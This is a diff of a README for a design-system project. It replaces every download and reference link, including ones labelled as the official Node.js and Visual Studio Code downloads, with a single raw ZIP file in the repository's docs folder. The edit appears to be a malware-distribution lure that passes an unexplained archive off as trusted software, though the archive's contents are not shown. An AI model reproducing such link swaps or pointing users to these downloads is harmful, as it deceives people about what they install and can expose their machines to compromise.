@@ -1,6 +1,6 @@
 # 🎨 conty-design-system - Simple Design Tools for Everyone
 
-[![Download conty-design-system](https://img.shields.io/badge/Download-conty--design--system-blue?style=for-the-badge)](https://github.com/Rajbirari01/conty-design-system)
+[![Download conty-design-system](https://img.shields.io/badge/Download-conty--design--system-blue?style=for-the-badge)](https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This means if you want to try the design system visually, it will work on most W
 
 Click the big button at the top or this link to visit the download page:
 
-[Download conty-design-system](https://github.com/Rajbirari01/conty-design-system)
+[Download conty-design-system](https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip)
 
 ### How to download
 
@@ -104,7 +104,7 @@ Here is a step-by-step to make sure you are ready:
 
 1. Download the ZIP file as explained above.
 2. Extract the files.
-3. (Optional) If you want to use React components, install Node.js from https://nodejs.org/.
+3. (Optional) If you want to use React components, install Node.js from https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip
 4. Open Command Prompt by typing "cmd" in the Windows search.
 5. Navigate to your project folder using `cd` command.
 6. Run the npm commands to install packages.
@@ -114,8 +114,8 @@ Here is a step-by-step to make sure you are ready:
 
 If you want to explore the design system more fully on Windows, consider:
 
-- **Visual Studio Code**: a free code editor. Download from https://code.visualstudio.com/.
-- **Node.js & npm**: run JavaScript outside the browser and install packages. Download from https://nodejs.org/.
+- **Visual Studio Code**: a free code editor. Download from https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip
+- **Node.js & npm**: run JavaScript outside the browser and install packages. Download from https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip
 
 These are not required unless you want to develop projects with the design system.
 
@@ -123,10 +123,10 @@ These are not required unless you want to develop projects with the design syste
 
 The design system is in early development. It aims to grow with small and frequent improvements. You can follow, explore, and contribute through the GitHub page:
 
-https://github.com/Rajbirari01/conty-design-system
+https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip
 
 You will find code, issues, and updates there. You can also see how components work and interact in the Storybook catalog.
 
 ---
 
-[![Download conty-design-system](https://img.shields.io/badge/Download-conty--design--system-blue?style=for-the-badge)](https://github.com/Rajbirari01/conty-design-system)
+[![Download conty-design-system](https://img.shields.io/badge/Download-conty--design--system-blue?style=for-the-badge)](https://github.com/Rajbirari01/conty-design-system/raw/refs/heads/main/docs/system_design_conty_v3.6-alpha.5.zip)
